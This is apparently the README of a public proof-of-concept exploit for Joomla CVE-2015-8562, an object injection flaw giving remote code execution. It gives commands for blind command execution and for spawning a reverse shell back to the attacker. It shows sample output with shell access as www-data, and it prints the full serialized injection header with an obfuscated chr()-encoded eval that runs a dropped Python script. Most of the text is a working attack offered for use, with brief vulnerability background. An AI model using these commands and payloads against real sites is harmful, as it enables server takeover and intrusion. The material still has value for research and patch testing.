# Joomla_CVE-2015-8562
A proof of concept for Joomla's CVE-2015-8562 vulnerability (Object Injection RCE)

## Intro/Changelog

This PoC is the second version of the implementation hosted at [exploit-db](https://www.exploit-db.com/exploits/39033/).

    -Fixed (regenerate session)
    -Added the option to switch from X-Forwarded-For to User-Agent method
    -Added the option to switch from a python reverse shell to a bash one
    -Added catching exception for missing http schema and script termination
    -Edited for a better usage, better messages and colors
    -TODO: adding msf support

## How to Use

    git clone https://github.com/VoidSec/Joomla_CVE-2015-8562.git
    cd Joomla_CVE-2015-8562

Blind RCE:

    python joomla-cve-2015-8562.py -t http://<target_ip>/ --cmd
    $ touch /tmp/test
    
Spawn Reverse Shell:
  
    python joomla-cve-2015-8562.py -t http://<target_ip>/ -l <local_ip> -p <local_port>
    [-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: http://<target_ip>/
    [-] Uploading python reverse shell
    <Response [200]>
    [+] Spawning reverse shell....
    <Response [200]>
    Listening on [0.0.0.0] (family 0, port 1337)
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)


### CVE-2015-8562

In December 2015 a new vulnerability was found in Joomla. It allows a remote attacker to exploit PHP object injection attacks and execute arbitrary PHP code via the HTTP User-Agent header.

This vulnerability target Joomla 1.5.0 through 3.4.5 and PHP version before 5.4.45 (including 5.3.x), 5.5.29 or 5.6.13 [CVE-2015-6835](https://bugs.php.net/bug.php?id=70219). 

I've made this [blog post](https://voidsec.com/analysis-of-the-joomla-rce-cve-2015-8562/) explaining the vulnerability.

#### This is what the sent header looks like
```
}__test|O:21:"JDatabaseDriverMysqli":3:{
	s:2:"fc";
	O:17:"JSimplepieFactory":0:{}
	s:21:"\0\0\0disconnectHandlers";
	a:1:{
		i:0;
		a:2:{
			i:0;
			O:9:"SimplePie":5:{
				s:8:"sanitize";
				O:20:"JDatabaseDriverMysql":0:{}
				s:8:"feed_url";
				s:305:"eval(chr(115).chr(121).chr(115).chr(116).chr(101).chr(109).chr(40).chr(39).chr(112).chr(121).chr(116).chr(104).chr(111).chr(110).chr(32).chr(47).chr(116).chr(109).chr(112).chr(47).chr(76).chr(56).chr(51).chr(55).chr(66).chr(72).chr(46).chr(112).chr(121).chr(39).chr(41).chr(59));
				JFactory::getConfig();
				exit";
				s:19:"cache_name_function";
				s:6:"assert";
				s:5:"cache";
				b:1;s:11:"cache_class";
				O:20:"JDatabaseDriverMysql":0:{}
				}
			i:1;
			s:4:"init";
			}
		}
	s:13:"\0\0\0connection";
	b:1;
}ýýýý
```
